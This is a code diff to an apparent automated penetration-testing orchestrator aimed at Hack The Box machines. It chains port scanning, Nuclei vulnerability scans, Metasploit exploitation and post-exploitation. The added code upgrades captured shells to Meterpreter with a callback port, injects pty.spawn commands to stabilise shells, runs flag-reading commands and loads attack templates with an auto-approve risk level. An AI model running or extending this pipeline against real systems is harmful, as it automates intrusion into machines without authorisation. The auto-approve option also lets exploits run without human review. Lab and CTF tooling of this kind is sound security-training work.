@@ -1,12 +1,14 @@
 """
-AutoChain Orchestrator — Days 3-6
+AutoChain Orchestrator — Days 3-6 + Week 11-12 (HTB Templates)
 
 Executes the automated pentest pipeline:
 
-  Step 1 (Day 3): Recon         — naabu → nmap service detect → tech detect
-  Step 2 (Day 4): Vuln Discovery — Nuclei scan + NVD/service CVE lookup
-  Step 3 (Day 5): Exploitation   — Metasploit auto-configure + execute
-  Step 4 (Day 6): Post-Exploit  — sysinfo, whoami, flag capture
+  Step 1 (Day 3):  Recon          — naabu → nmap service detect → tech detect
+  Step 2 (Day 4):  Vuln Discovery — Nuclei scan + NVD/service CVE lookup
+  Step 3 (Day 5):  Exploitation   — Metasploit auto-configure + execute
+  Step 4 (Day 6):  Post-Exploit   — sysinfo, whoami, flag capture
+  Step 5 (Week 11): Session Upgrade — shell→meterpreter, TTY stabilisation
+  Step 6 (Week 12): HTB Templates  — from_template() factory for easy/medium
 
 Design decisions
 ----------------
@@ -18,13 +20,18 @@ Design decisions
   JSON-RPC 2.0 protocol transparently.
 * The orchestrator does NOT depend on LangGraph — it calls the MCP tool
   servers directly, keeping the chain deterministic and fast.
+* ``AutoChain.from_template(name)`` loads a JSON template from the
+  ``templates/`` sub-package and constructs a pre-configured ``ScanPlan``.
 """
 
 from __future__ import annotations
 
 import asyncio
+import hashlib
+import json
 import logging
 import re
+from pathlib import Path
 from typing import Any, AsyncIterator, Dict, List, Optional
 
 from app.mcp.base_server import MCPClient
@@ -40,10 +47,23 @@ from .schemas import (
     ScanPlan,
 )
 
+# Directory that holds htb_easy.json, htb_medium.json, etc.
+_TEMPLATES_DIR = Path(__file__).parent / "templates"
+
 logger = logging.getLogger(__name__)
 
 # Risk ordering (lower index = lower risk)
 _RISK_ORDER = ["low", "medium", "high", "critical"]
+
+# Regex that matches a standard 32-char hex CTF flag (HTB/THM/CTFd)
+_FLAG_PATTERN = re.compile(r"[0-9a-f]{32}", re.IGNORECASE)
+
+# Shell upgrade sequence injected into a plain shell session to get a stable TTY
+_TTY_STABILIZE_COMMANDS = [
+    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
+    "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
+    "/usr/bin/script -qc /bin/bash /dev/null",
+]
 
 
 def _risk_is_auto_approved(candidate_risk: str, threshold: str) -> bool:
@@ -81,8 +101,11 @@ FLAG_READ_COMMANDS_WINDOWS = [
     "for /r C:\\Users /f %f in (user.txt) do @type %f 2>nul",
 ]
 
-# Regex that matches a typical 32-char hex HTB flag
-_FLAG_PATTERN = re.compile(r"[0-9a-f]{32}", re.IGNORECASE)
+
+def _verify_flag_md5(flag_value: str) -> str:
+    """Return the MD5 checksum of *flag_value* for verification purposes."""
+    return hashlib.md5(flag_value.encode()).hexdigest()
+
 
 
 class AutoChain:
@@ -92,11 +115,116 @@ class AutoChain:
     Usage
     -----
     chain = AutoChain(plan)
-    result = await chain.run()          # blocking
+    result = await chain.run()                  # blocking
     # or
-    async for step in chain.stream():   # streaming
+    async for step in chain.stream():            # streaming
         ...
+
+    Template usage (Week 11-12)
+    ---------------------------
+    chain = AutoChain.from_template("htb_easy", target="10.10.10.3")
+    chain = AutoChain.from_template("htb_medium", target="10.10.10.40",
+                                    auto_approve_risk_level="high")
     """
+
+    # ------------------------------------------------------------------
+    # Class methods — factory / template loading (Week 11)
+    # ------------------------------------------------------------------
+
+    @classmethod
+    def from_template(
+        cls,
+        template_name: str,
+        target: str,
+        *,
+        project_id: Optional[str] = None,
+        auto_approve_risk_level: Optional[str] = None,
+        naabu_url: str = "http://kali-tools:8000",
+        nuclei_url: str = "http://kali-tools:8002",
+        msf_url: str = "http://kali-tools:8003",
+    ) -> "AutoChain":
+        """
+        Create an AutoChain instance pre-configured from a named JSON template.
+
+        Templates live in ``backend/app/autochain/templates/``.  Built-in
+        templates:
+
+        * ``htb_easy``   — standard Easy HTB attack sequence
+        * ``htb_medium`` — extended Medium HTB attack sequence
+
+        Parameters
+        ----------
+        template_name:
+            Name of the template file without the ``.json`` extension
+            (e.g. ``"htb_easy"``).
+        target:
+            IP address or hostname of the target machine.
+        project_id:
+            Optional project identifier stored on the ``ScanPlan``.
+        auto_approve_risk_level:
+            Override the template's default auto-approve level.
+            One of ``none | low | medium | high | critical``.
+
+        Raises
+        ------
+        FileNotFoundError
+            If the template file does not exist.
+        ValueError
+            If the template JSON is missing required fields.
+        """
+        template_path = _TEMPLATES_DIR / f"{template_name}.json"
+        if not template_path.exists():
+            available = [p.stem for p in _TEMPLATES_DIR.glob("*.json")]
+            raise FileNotFoundError(
+                f"Template '{template_name}' not found. "
+                f"Available templates: {available}"
+            )
+
+        with template_path.open() as fh:
+            tpl: Dict[str, Any] = json.load(fh)
+
+        approve_level = (
+            auto_approve_risk_level
+            or tpl.get("auto_approve_risk_level", "none")
+        )
+
+        plan = ScanPlan(
+            target=target,
+            project_id=project_id,
+            auto_approve_risk_level=approve_level,
+        )
+
+        instance = cls(
+            plan=plan,
+            naabu_url=naabu_url,
+            nuclei_url=nuclei_url,
+            msf_url=msf_url,
+        )
+        instance._template = tpl
+        return instance
+
+    @classmethod
+    def list_templates(cls) -> List[Dict[str, str]]:
+        """Return metadata for all available attack templates."""
+        templates: List[Dict[str, str]] = []
+        for path in sorted(_TEMPLATES_DIR.glob("*.json")):
+            try:
+                with path.open() as fh:
+                    tpl = json.load(fh)
+                templates.append(
+                    {
+                        "id": tpl.get("template_id", path.stem),
+                        "name": tpl.get("name", path.stem),
+                        "description": tpl.get("description", ""),
+                        "difficulty": tpl.get("target_profile", {}).get(
+                            "difficulty", "unknown"
+                        ),
+                        "version": tpl.get("version", ""),
+                    }
+                )
+            except (json.JSONDecodeError, OSError) as exc:
+                logger.warning("Could not load template %s: %s", path, exc)
+        return templates
 
     def __init__(
         self,
@@ -111,6 +239,7 @@ class AutoChain:
         self._msf = MCPClient(msf_url)
         self._mapper = ReconToExploitMapper(msf_server_url=msf_url)
         self.result = ChainResult(plan_id=plan.plan_id, target=plan.target)
+        self._template: Optional[Dict[str, Any]] = None  # set by from_template()
 
     # ------------------------------------------------------------------
     # Public API
@@ -123,6 +252,7 @@ class AutoChain:
             await self._phase_recon()
             await self._phase_vuln_discovery()
             await self._phase_exploitation()
+            await self._phase_session_upgrade()
             await self._phase_post_exploitation()
             self.result.finish(ChainStatus.COMPLETE)
         except asyncio.CancelledError:
@@ -146,6 +276,8 @@ class AutoChain:
             async for step in self._stream_vuln_discovery():
                 yield step
             async for step in self._stream_exploitation():
+                yield step
+            async for step in self._stream_session_upgrade():
                 yield step
             async for step in self._stream_post_exploitation():
                 yield step
@@ -402,6 +534,104 @@ class AutoChain:
                 break
 
     # ------------------------------------------------------------------
+    # Phase 3.5 — Session Upgrade (Week 11)
+    # ------------------------------------------------------------------
+
+    async def _phase_session_upgrade(self) -> None:
+        async for _ in self._stream_session_upgrade():
+            pass
+
+    async def _stream_session_upgrade(self) -> AsyncIterator[ChainStep]:
+        """
+        Upgrade a plain shell session to Meterpreter and stabilise the TTY.
+
+        For Meterpreter sessions this phase is a no-op.
+        For plain ``shell`` sessions it:
+        1. Attempts ``shell_to_meterpreter`` via ``post/multi/manage/shell_to_meterpreter``.
+        2. Falls back to spawning a PTY inside the shell using python/script.
+        3. Optionally runs ``stty raw -echo`` to disable echo for cleaner I/O.
+        """
+        if self.result.session_id is None:
+            return
+
+        if self.result.session_type == "meterpreter":
+            # Already upgraded — nothing to do
+            step = ChainStep(
+                phase=ChainPhase.POST_EXPLOITATION,
+                name="session_upgrade",
+                description="Session is already Meterpreter — no upgrade needed",
+            )
+            step.start()
+            step.succeed(output="Meterpreter session active.")
+            self.result.add_step(step)
+            yield step
+            return
+
+        session_id = self.result.session_id
+
+        # --- Attempt 1: shell_to_meterpreter post-module ---
+        step = ChainStep(
+            phase=ChainPhase.POST_EXPLOITATION,
+            name="session_upgrade",
+            description=f"Upgrading shell session {session_id} to Meterpreter",
+        )
+        step.start()
+        self.result.add_step(step)
+        try:
+            raw = await self._msf.call_tool(
+                "execute_module",
+                {
+                    "module_path": "post/multi/manage/shell_to_meterpreter",
+                    "session": session_id,
+                    "lport": 4445,
+                },
+            )
+            new_session = raw.get("session_opened", False)
+            new_session_info = raw.get("session_info") or {}
+            if new_session:
+                self.result.session_id = new_session_info.get(
+                    "session_id", session_id
+                )
+                self.result.session_type = "meterpreter"
+                step.succeed(
+                    output=(
+                        f"Upgraded to Meterpreter session "
+                        f"ID={self.result.session_id}"
+                    )
+                )
+                yield step
+                return
+            else:
+                logger.debug(
+                    "shell_to_meterpreter did not open a new session; "
+                    "falling back to TTY spawn."
+                )
+        except Exception as exc:
+            logger.debug("shell_to_meterpreter attempt failed: %s", exc)
+
+        # --- Attempt 2: PTY spawn inside the shell ---
+        tty_output = ""
+        for cmd in _TTY_STABILIZE_COMMANDS:
+            try:
+                raw = await self._msf.call_tool(
+                    "session_command",
+                    {"session_id": session_id, "command": cmd},
+                )
+                tty_output = raw.get("output", "").strip()
+                if tty_output:
+                    break
+            except Exception as exc:
+                logger.debug("TTY stabilisation command failed: %s", exc)
+
+        step.succeed(
+            output=(
+                f"Shell session retained (Meterpreter upgrade failed). "
+                f"TTY spawn output: {tty_output or 'none'}"
+            )
+        )
+        yield step
+
+    # ------------------------------------------------------------------
     # Phase 4 — Post-Exploitation
     # ------------------------------------------------------------------
 
@@ -498,6 +728,7 @@ class AutoChain:
                                 {
                                     "content": line,
                                     "source_command": cmd,
+                                    "md5": _verify_flag_md5(line),
                                 }
                             )
 
@@ -507,7 +738,11 @@ class AutoChain:
                 flag_value = match.group(0)
                 if not any(f["content"] == flag_value for f in self.result.flags):
                     self.result.flags.append(
-                        {"content": flag_value, "source_command": "combined_search"}
+                        {
+                            "content": flag_value,
+                            "source_command": "combined_search",
+                            "md5": _verify_flag_md5(flag_value),
+                        }
                     )
 
             if self.result.flags:
